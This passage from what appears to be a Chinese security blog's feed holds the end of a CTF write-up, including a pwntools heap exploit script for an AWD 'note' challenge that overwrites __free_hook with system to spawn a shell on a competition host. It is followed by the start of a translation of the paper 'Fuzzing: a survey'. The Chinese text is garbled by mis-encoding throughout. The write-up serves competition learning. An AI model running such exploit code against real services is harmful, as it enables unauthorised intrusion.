class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;free_hook: 0x%x&quot;</span> % free_hook)</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">27</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x78</span>, p64(system))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;30&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="AWD-pwn"><a href="#AWD-pwn" class="headerlink" title="AWD pwn"></a>AWD pwn</h2><p>ç¬¬äºŒå¤©çš„æ”»é˜²æ˜¯ 2019 å›½èµ›åŠå†³èµ›åä¸œåŒ—èµ›åŒºåŸé¢˜ï¼šnoteâ€¦â€¦â€¦â€¦â€¦â€¦..</p>
<p>è†œä¸€æ³¢ le3d1ng å¤§ä½¬ï¼Œå’±æ²¡æœ‰å¤ç°ï¼Œä¹Ÿæ²¡æœ‰ EXPï¼Œåªèƒ½è¢«åŠé”¤ ORZ</p>
<p>é™„ä¸€ä¸ªçˆ¬æµé‡å†™å‡ºæ¥çš„è„šæœ¬</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;172.29.2.102&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;length&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">240</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">136</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">136</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">408</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">112</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">88</span>, <span class="string">&quot;/bin/sh;/bin/sh;/bin/sh  ||     &quot;</span> + p64(libc_addr + <span class="number">0x1c30</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;remarks&gt; &quot;</span>)</span><br><span class="line">p.sendline(p64(libc_addr - <span class="number">0x37f7e8</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>çœ‹èµ·æ¥å’Œ pwn3 å·®ä¸å¤šå‘€ï¼Œä¹Ÿæ˜¯ off-by-null + size æ§åˆ¶çš„æ¯”è¾ƒæ­»ï¼Œæ—¶é—´å¤ªæ™šäº†ï¼Œä¿ºè¦ç¡è§‰ä¿å‘½å•¦ï¼Œä¹‹åæœ‰æ—¶é—´å†è¯´å§ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Fuzzing a survey è¯‘æ–‡</title>
    <url>/2019/10/29/Fuzzing_a_survey/</url>
    <content><![CDATA[<p>æœ¬æ–‡ç¿»è¯‘è‡ª ã€ŠFuzzing: a surveyã€‹</p>
<p> <a class="link"   href="https://link.springer.com/article/10.1186/s42400-018-0002-y" >https://link.springer.com/article/10.1186/s42400-018-0002-y<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyright information</span><br><span class="line"></span><br><span class="line">Â© The Author(s) 2018</span><br><span class="line"></span><br><span class="line">Open Access</span><br><span class="line"></span><br><span class="line">This article is distributed under the terms of the Creative Commons Attribution 4.0 International License (http://creativecommons.org/licenses/by/4.0/), which permits unrestricted use, distribution, and reproduction in any medium, provided you give appropriate credit to the original author(s) and the source, provide a link to the Creative Commons license, and indicate if changes were made.</span><br></pre></td></tr></table></figure></div>

<p>Update: 2020-11-03</p>
<span id="more"></span>

<p><strong>æ¦‚è¿°</strong></p>
<p>æ¼æ´æ˜¯å¨èƒäº’è”ç½‘å®‰å…¨çš„æ ¹æºä¹‹ä¸€ã€‚ä¸ºäº†æå‰å‘ç°ã€ä¿®å¤æ¼æ´ï¼Œç ”ç©¶è€…å·²ç»å¼€å‘å‡ºå‡ ç§ä¸åŒçš„æµ‹è¯•æ‰‹æ®µï¼Œå…¶ä¸­æ¨¡ç³Šæµ‹è¯•æ˜¯åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„æŠ€æœ¯ä¹‹ä¸€ã€‚è¿‘å¹´æ¥ï¼Œæ¨¡ç³Šæµ‹è¯•è§£å†³æ–¹æ¡ˆä¾‹å¦‚ AFLï¼Œå·²ç»åœ¨æ¼æ´æŒ–æ˜é¢†åŸŸå–å¾—äº†ä¸å°çš„æˆæœã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦æ€»ç»“è¿‘å¹´æ¥å‡ºç°çš„ fuzz æŠ€æœ¯ï¼Œå¹¶ä¸”æ¯”è¾ƒå®ƒä»¬å­°ä¼˜å­°åŠ£ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬è®¨è®ºä¸€ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆ fuzz æŠ€æœ¯å¦‚æ­¤æµè¡Œï¼Ÿé€šè¿‡æ¯”è¾ƒä¸åŒçš„æ¼æ´æŒ–æ˜æ–¹æ¡ˆæ€»ç»“ä¸€ä¸ªç­”æ¡ˆã€‚<br>æ¥ç€æˆ‘ä»¬å›é¡¾ fuzz æŠ€æœ¯ï¼Œå¹¶ä¸”è¯¦ç»†è®¨è®ºå…¶ä¸­æœ€ä¸ºæµè¡Œçš„æŠ€æœ¯ï¼šåŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•ã€‚ç„¶åæˆ‘ä»¬æå‡ºä¸€ç§å¯ä»¥ä½¿ fuzz æ›´åŠ èªæ˜ã€æ•ˆç‡æ›´é«˜çš„æŠ€æœ¯ã€‚<br>æœ€åæˆ‘ä»¬å±•ç¤ºä¸€äº› fuzz å®ä¾‹ï¼Œè®¨è®º fuzz æœªæ¥çš„å‘å±•æ–¹å‘ã€‚</p>
<p><strong>ç®€ä»‹</strong></p>
<p>å®‰å…¨æ¼æ´å·²ç»æˆä¸ºäº’è”ç½‘çš„ä¸»è¦å¨èƒä¹‹ä¸€ï¼Œåœ¨ RFC 2828 ç»™å‡ºæ¼æ´çš„å®šä¹‰ï¼šæ¼æ´æ˜¯ä¸€ä¸ªç³»ç»Ÿåœ¨è®¾è®¡ã€å®ç°ã€æ“ä½œã€ç®¡ç†ä¸Šçš„ç‘•ç–µæˆ–å¼±ç‚¹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›å¼±ç‚¹ç»•è¿‡ç³»ç»Ÿçš„å®‰å…¨ç­–ç•¥ã€‚<br>é€šè¿‡åˆ©ç”¨æ¼æ´(ç‰¹åˆ«æ˜¯ 0day æ¼æ´)ï¼Œæ”»å‡»è€…å¯å¯¹ç³»ç»Ÿé€ æˆä¸¥é‡çš„å¨èƒã€‚<br>2017 å¹´çš„ WannaCry å‹’ç´¢è€…ç—…æ¯’æ‰€åˆ©ç”¨çš„å°±æ˜¯å¾®è½¯ SMB åè®®æ¼æ´ã€‚æ ¹æ®æŠ¥å‘Šï¼ŒWannaCry åœ¨ä¸€å¤©å†…æ„ŸæŸ“äº†åˆ†å¸ƒåœ¨ 150 ä¸ªå›½å®¶æˆ–åœ°åŒºè¿‘ 230000 å°è®¡ç®—æœºè®¾å¤‡ã€‚å®ƒå¯¹é‡‘èã€èƒ½æºã€åŒ»ç–—ç­‰äº§ä¸šé€ æˆäº†ä¸å¯ä¼°é‡çš„æŸå¤±ã€‚<br>è€ƒè™‘åˆ°æ¼æ´å¯¹ç³»ç»Ÿé€ æˆçš„ä¸¥é‡å±å®³ï¼Œç ”ç©¶è€…ä»¬åœ¨æ¼æ´æŒ–æ˜æŠ€æœ¯ä¸ŠæŠ•å…¥äº†å¾ˆå¤šåŠªåŠ›ã€‚<br>ç›®å‰æå‡ºçš„æ¼æ´æŒ–æ˜æ–¹æ³•æœ‰ï¼šé™æ€åˆ†æã€åŠ¨æ€åˆ†æã€ç¬¦å·æ‰§è¡Œã€æ¨¡ç³Šæµ‹è¯•<br>å…¶ä¸­ fuzz æŠ€æœ¯å…è®¸åœ¨å¯¹æµ‹è¯•ç›®æ ‡çŸ¥ä¹‹ç”šå°‘çš„æƒ…å†µä¸‹å±•å¼€æµ‹è¯•ï¼Œæ­£å¤„äºçƒ­é—¨é˜¶æ®µï¼Œåœ¨å·¥ä¸šæ§åˆ¶é¢†åŸŸå°¤ä¸ºå¦‚æ­¤ã€‚<br>fuzz çš„æ¦‚å¿µäº 1990 å¹´ä»£é¦–æ¬¡æå‡ºã€‚é€šè¿‡æ•°å¹´çš„ç ”ç©¶ï¼Œfuzz æŠ€æœ¯å¾—åˆ°äº†ä¸€å®šçš„å‘å±•ã€‚ç„¶è€Œåœ¨å®é™…æµ‹è¯•ä¸­ï¼Œfuzz åªèƒ½æ‰¾åˆ°æœ‰é™çš„å†…å­˜ç ´åæ¼æ´ï¼Œå¹¶ä¸”å¯¹ä»£ç çš„è¦†ç›–ç‡å¾ˆä½ã€‚æ­¤å¤–ï¼Œéšæœºçš„æµ‹è¯•æµç¨‹å¯¹äºæ¼æ´æŒ–æ˜æ¥è¯´æ•ˆç‡æä½ï¼Œæ‰€ä»¥å¾ˆå¤šæå‡ fuzz æ•ˆç‡çš„æ–¹å¼é€æ¸è¢«æå‡ºã€‚<br>ç»“åˆäº†åé¦ˆå¯¼å‘-é—ä¼ ç®—æ³•çš„ fuzz æŠ€æœ¯è¾ƒä¹‹å‰æ›´åŠ çµæ´»é«˜æ•ˆã€‚å…¶ä¸­çš„ä½¼ä½¼è€…å°±æ˜¯ AFL fuzzerã€‚å—åˆ° AFL çš„å¯å‘ï¼Œå¾ˆå¤šé«˜æ•ˆçš„è§£å†³æ–¹æ¡ˆå’Œæ”¹è¿›ç­–ç•¥è¢«æå‡ºï¼Œfuzz æŠ€æœ¯å’Œåå‡ å¹´å‰å¤§æœ‰ä¸åŒã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¿…è¦æ€»ç»“ä¸€ä¸‹ç ”ç©¶è€…ä»¬æ°å‡ºçš„å·¥ä½œï¼Œå¹¶ä¸”å±•æœ› fuzz æŠ€æœ¯çš„æœªæ¥ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ç»„ç»‡ç»“æ„å¦‚ä¸‹ï¼šâ€œèƒŒæ™¯çŸ¥è¯†â€å°èŠ‚ä»‹ç»äº†æ¼æ´æŒ–æ˜çš„åŸºç¡€çŸ¥è¯†å’ŒæŠ€æœ¯ï¼Œâ€æ¨¡ç³Šæµ‹è¯•â€œå°èŠ‚é’ˆå¯¹ fuzz æŠ€æœ¯ç»™å‡ºè¯¦ç»†çš„åŸç†æè¿°ï¼ŒåŒ…æ‹¬åŸºç¡€æ¦‚å¿µå’Œ fuzz é¢ä¸´çš„å…³é”®é—®é¢˜ã€‚åœ¨â€œåŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•â€å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä¸€ç§ coverage-based fuzzer ä»¥åŠç ”ç©¶è€…ä»¬å›´ç»•å®ƒæ‰€åšçš„ä¸€äº›å·¥ä½œã€‚åœ¨â€œæŠ€æœ¯èåˆâ€å°èŠ‚ä¸­æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹èƒ½å¤Ÿæå‡ fuzz æ•ˆç‡çš„å‡ ç§æŠ€æœ¯ï¼Œä»¥åŠåŸç†ã€‚â€œå¯¹ä¸åŒåº”ç”¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•â€å°èŠ‚é’ˆå¯¹å‡ ç§ä¸åŒçš„åº”ç”¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚â€œfuzz æŠ€æœ¯çš„æ–°è¶‹åŠ¿â€å°èŠ‚æˆ‘ä»¬è®¨è®ºå’Œæ€»ç»“ fuzz æŠ€æœ¯çš„å‘å±•è¶‹åŠ¿ã€‚æœ€ååœ¨â€œç»“è®ºâ€å°èŠ‚ä¸­æ€»ç»“è¿™ç¯‡æ–‡ç« ã€‚</p>
<p><strong>èƒŒæ™¯çŸ¥è¯†(Background)</strong></p>
<p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å¯¹äºä¼ ç»Ÿæ¼æ´æŒ–æ˜æŠ€æœ¯ç»™å‡ºä¸€ä¸ªç®€çŸ­çš„ä»‹ç»ï¼ŒåŒ…æ‹¬é™æ€åˆ†æã€åŠ¨æ€åˆ†æã€æ±¡ç‚¹è¿½è¸ªã€ç¬¦å·æ‰§è¡Œå’Œæ¨¡ç³Šæµ‹è¯•ã€‚æ¥ç€æˆ‘ä»¬åˆ†åˆ«æ€»ç»“è¿™äº›æ–¹æ¡ˆçš„ä¼˜ç¼ºç‚¹ã€‚</p>
<p><strong>é™æ€åˆ†æ</strong><br>é™æ€åˆ†ææŒ‡çš„æ˜¯åœ¨ä¸è¿è¡Œç¨‹åºçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›åˆ†ææ“ä½œã€‚å®é™…ä¸Šé™æ€åˆ†ææ‰‹æ®µç»å¸¸è¢«ç”¨åœ¨å…·æœ‰æºä»£ç æˆ–è€…æŠ½è±¡ä»£ç çš„æƒ…å†µã€‚é€šè¿‡åˆ†æè¯æ³•ã€è¯­æ³•ã€è¯­ä¹‰ã€æ•°æ®æµã€æ¨¡å‹ï¼Œå¯ä»¥æ‰¾åˆ°éšè—åœ¨å†…éƒ¨çš„ BUGã€‚<br>é™æ€åˆ†æçš„ä¼˜ç‚¹æ˜¯æ£€æµ‹é€Ÿåº¦å¿«ã€‚åˆ†æäººå‘˜å¯ä½¿ç”¨é™æ€åˆ†æå·¥å…·å¿«é€Ÿæ£€æŸ¥æºä»£ç ï¼Œå¹¶ä¸”åœ¨çŸ­æ—¶é—´å†…å®šä½ BUGã€‚ç„¶è€Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œé™æ€åˆ†æçš„é”™è¯¯ç‡å¾ˆé«˜ã€‚ç”±äºç¼ºå°‘ç®€å•æ˜“ç”¨çš„å¨èƒæ£€æµ‹æ¨¡å‹ï¼Œé™æ€åˆ†æå·¥å…·æ€»æ˜¯å­˜åœ¨å¤§é‡çš„è¯¯æŠ¥ç»“æœï¼Œå› æ­¤é€šè¿‡å·¥å…·çš„ç»“æœå†å»åˆ¤æ–­æ˜¯å¦çœŸçš„å­˜åœ¨æ¼æ´æ˜¯ä¸€é¡¹è‰°è‹¦çš„å·¥ä½œã€‚</p>
<p><strong>åŠ¨æ€åˆ†æ</strong><br>å’Œé™æ€åˆ†æä¸åŒï¼ŒåŠ¨æ€åˆ†æéœ€è¦ä¸€ä¸ªçœŸå®çš„æˆ–æ˜¯æ¨¡æ‹Ÿçš„è¿è¡Œç¯å¢ƒã€‚é€šè¿‡ç›‘æ§å’Œåˆ†æç¨‹åºè¿è¡ŒçŠ¶æ€ï¼Œåˆ†æå·¥å…·å¯ä»¥æ¸…æ™°åœ°æ£€æµ‹åˆ°ç¨‹åºçš„å¼‚å¸¸ã€‚åŠ¨æ€åˆ†æå…¶ä¼˜ç‚¹æ˜¯ç»“æœé«˜åº¦ç²¾ç¡®ï¼Œä½†æ˜¯ä¹Ÿå­˜åœ¨å¾ˆå¤šç¼ºé™·ã€‚<br>é¦–å…ˆï¼ŒåŠ¨æ€è°ƒè¯•åˆ†æç¨‹åºéœ€è¦å¤§é‡çš„äººå·¥äº¤äº’æ“ä½œï¼Œå¯¼è‡´åˆ†ææ•ˆç‡ä½ä¸‹ã€‚å¦å¤–ï¼Œåˆ†æç¨‹åºçš„ç ”ç©¶äººå‘˜éœ€è¦å…·æœ‰è¾ƒå¼ºçš„ä¸“ä¸šçŸ¥è¯†å’ŒæŠ€èƒ½ã€‚ç®€è€Œè¨€ä¹‹ï¼ŒåŠ¨æ€åˆ†æåªé€‚åˆå°èŒƒå›´çš„åˆ†æï¼Œå¹¶ä¸”å¯¹äººå‘˜æœ‰è¾ƒé«˜è¦æ±‚ã€‚</p>
<p><strong>ç¬¦å·æ‰§è¡Œ</strong><br>ç¬¦å·æ‰§è¡Œæ˜¯ä¸€ç§è¢«è®¤ä¸ºæ˜¯éå¸¸æœ‰å‰é€”çš„æ¼æ´æŒ–æ˜æŠ€æœ¯ã€‚é€šè¿‡ç¬¦å·åŒ–ç¨‹åºè¾“å…¥ï¼Œç¬¦å·æ‰§è¡Œä¸ºæ¯ä¸ªæ‰§è¡Œè·¯å¾„ç»´æŠ¤ä¸€ç»„çº¦æŸæ¡ä»¶ã€‚æ‰§è¡Œä¹‹åï¼Œå°†ä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ¥æ±‚è§£çº¦æŸï¼Œå¹¶ç¡®å®šç”±å“ªäº›è¾“å…¥å¯¼è‡´è¿™æ¡è·¯å¾„è¢«æ‰§è¡Œã€‚ä»ç†è®ºä¸Šè®²ï¼Œç¬¦å·æ‰§è¡Œå¯ä»¥è¦†ç›–ç¨‹åºä¸­çš„ä»»ä½•æ‰§è¡Œè·¯å¾„ï¼Œåœ¨å°ç¨‹åºæµ‹è¯•ä¸­è¡¨ç°å‡ºè‰¯å¥½çš„æ•ˆæœï¼Œä½†ä¹Ÿå­˜åœ¨è®¸å¤šå±€é™æ€§ã€‚é¦–å…ˆï¼Œè·¯å¾„çˆ†ç‚¸é—®é¢˜ã€‚éšç€ç¨‹åºè§„æ¨¡çš„æ‰©å¤§ï¼Œæ‰§è¡ŒçŠ¶æ€ä¹Ÿéšä¹‹çˆ†ç‚¸ï¼Œè¶…å‡ºäº†çº¦æŸæ±‚è§£å™¨çš„æ±‚è§£èƒ½åŠ›ã€‚ç¬¬äºŒï¼Œç¯å¢ƒç›¸äº’ä½œç”¨ã€‚åœ¨ç¬¦å·æ‰§è¡Œä¸­ï¼Œå½“ç›®æ ‡ç¨‹åºä¸ç¬¦å·æ‰§è¡Œç¯å¢ƒä¹‹å¤–çš„ç»„ä»¶ï¼ˆå¦‚ç³»ç»Ÿè°ƒç”¨ã€å¤„ç†ä¿¡å·ç­‰ï¼‰äº¤äº’æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚å‰äººçš„å·¥ä½œå·²ç»è¯æ˜ï¼Œç¬¦å·æ‰§è¡Œç›®å‰ä»ç„¶å¾ˆéš¾åº”ç”¨åˆ°å¤§å‹åº”ç”¨ç¨‹åºä¸Šã€‚</p>
<p><strong>æ¨¡ç³Šæµ‹è¯•</strong><br>Fuzz æ˜¯ç›®å‰æœ€æµè¡Œçš„æ¼æ´å‘ç°æŠ€æœ¯ã€‚æ¨¡ç³Šæµ‹è¯•æ˜¯20ä¸–çºª90å¹´ä»£ç”±ç¾å›½å¨æ–¯åº·æ˜Ÿå·å¤§å­¦çš„Barton Milleré¦–æ¬¡æå‡ºçš„ï¼Œæ¨¡ç³Šæµ‹è¯•äº§ç”Ÿå¤§é‡çš„æ­£å¸¸å’Œå¼‚å¸¸è¾“å…¥ï¼Œé€šè¿‡å°†ç”Ÿæˆçš„å†…å®¹åé¦ˆç»™ç›®æ ‡åº”ç”¨ç¨‹åºå¹¶ç›‘æ§æ‰§è¡ŒçŠ¶æ€æ¥æ£€æµ‹æ˜¯å¦è§¦å‘å¼‚å¸¸ã€‚ä¸å…¶ä»–æŠ€æœ¯ç›¸æ¯”ï¼Œfuzz æŠ€æœ¯æ˜“äºéƒ¨ç½²ï¼Œå…·æœ‰è‰¯å¥½çš„å¯æ‰©å±•æ€§å’Œé€‚ç”¨æ€§ï¼Œå¯ä»¥åœ¨æœ‰æºä»£ç æˆ–æ— æºä»£ç çš„æƒ…å†µä¸‹æ‰§è¡Œã€‚æ­¤å¤–ï¼Œç”±äºæ¨¡ç³Šæµ‹è¯•åŸºäºç¨‹åºçš„æ­£å¸¸è¿è¡Œè¿‡ç¨‹ï¼Œå› æ­¤å…·æœ‰è¾ƒé«˜çš„ç²¾åº¦ã€‚fuzz å¯ä»¥å¾ˆå®¹æ˜“åœ°åº”ç”¨åˆ°å¤§è§„æ¨¡åº”ç”¨ç¨‹åºä¸Šã€‚å°½ç®¡æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯é¢ä¸´ç€æ•ˆç‡ä½ã€ä»£ç è¦†ç›–ç‡ä½ç­‰è¯¸å¤šç¼ºç‚¹ï¼Œä½†æ¨¡ç³ŠæŠ€æœ¯å·²ç»æˆä¸ºç›®å‰æœ€æœ‰æ•ˆã€æœ€å…ˆè¿›çš„æ¼æ´å‘ç°æŠ€æœ¯ä¹‹ä¸€ã€‚</p>
<p>è¡¨1æ˜¾ç¤ºäº†ä¸åŒæŠ€æœ¯çš„ä¼˜ç¼ºç‚¹ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey1.png"
                     
                ></p>
<p><strong>æ¨¡ç³Šæµ‹è¯•(Fuzzing)</strong></p>
<p><strong>æ¨¡ç³Šæµ‹è¯•çš„æ‰§è¡Œè¿‡ç¨‹</strong><br>å›¾ 1 æè¿°äº†ä¼ ç»Ÿæ¨¡ç³Šæµ‹è¯•çš„ä¸»è¦è¿‡ç¨‹ã€‚å·¥ä½œè¿‡ç¨‹ä¸»è¦ç”±å››ä¸ªé˜¶æ®µç»„æˆï¼šæµ‹è¯•ç”¨ä¾‹ç”Ÿæˆé˜¶æ®µã€æµ‹è¯•ç”¨ä¾‹è¿è¡Œé˜¶æ®µã€ç¨‹åºæ‰§è¡ŒçŠ¶æ€ç›‘æ§å’Œå¼‚å¸¸åˆ†æã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey2.png"
                     
                ></p>
<p>æ¨¡ç³Šæµ‹è¯•ä»ä¸€å †ç¨‹åºè¾“å…¥çš„ç”Ÿæˆå¼€å§‹ã€‚ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹çš„è´¨é‡ç›´æ¥å½±å“æµ‹è¯•æ•ˆæœã€‚è¾“å…¥åº”å°½å¯èƒ½æ»¡è¶³æµ‹è¯•ç¨‹åºå¯¹è¾“å…¥æ ¼å¼çš„è¦æ±‚ã€‚å¦ä¸€æ–¹é¢ï¼Œè¾“å…¥ä¹Ÿä¸èƒ½è¿‡äºéµå®ˆè¾“å…¥æ ¼å¼çš„è¦æ±‚ï¼Œè¿™äº›ç»è¿‡ç‰¹æ®Šå¤„ç†çš„è¾“å…¥å¾ˆå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚æ ¹æ®ç›®æ ‡ç¨‹åºçš„ä¸åŒï¼Œè¾“å…¥å¯ä»¥æ˜¯ä¸åŒæ ¼å¼çš„æ–‡ä»¶ã€ç½‘ç»œé€šä¿¡æ•°æ®ã€å…·æœ‰æŒ‡å®šç‰¹æ€§çš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ç­‰ã€‚å¦‚ä½•ç”Ÿæˆè¶³å¤Ÿå¥½çš„æµ‹è¯•ç”¨ä¾‹æ˜¯æ¨¡ç³Šæµ‹è¯•é¢ä¸´çš„ä¸»è¦æŒ‘æˆ˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰ä¸¤ç§å¸¸ç”¨çš„ç”Ÿæˆå™¨ï¼šåŸºäºç”Ÿæˆçš„ç”Ÿæˆå™¨å’ŒåŸºäºå˜å¼‚çš„ç”Ÿæˆå™¨ã€‚<br>æµ‹è¯•ç”¨ä¾‹åœ¨ç”Ÿæˆåè¢«é€åˆ°ç›®æ ‡ç¨‹åºã€‚fuzzers è‡ªåŠ¨å¯åŠ¨å’Œç»ˆæ­¢ç›®æ ‡ç¨‹åºï¼Œå¹¶é©±åŠ¨ç›®æ ‡ç¨‹åºçš„æµ‹è¯•ç”¨ä¾‹å¤„ç†è¿‡ç¨‹ã€‚åœ¨æ‰§è¡Œä¹‹å‰ï¼Œåˆ†æäººå‘˜å¯ä»¥é…ç½®ç›®æ ‡ç¨‹åºçš„å¯åŠ¨å’Œç»ˆæ­¢æ–¹å¼ï¼Œå¹¶é¢„å®šä¹‰å‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚é€šå¸¸ï¼Œæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹åœ¨è¶…æ—¶ã€ç¨‹åºæŒ‚èµ·æˆ–å´©æºƒçš„æ—¶å€™åœæ­¢ã€‚</p>
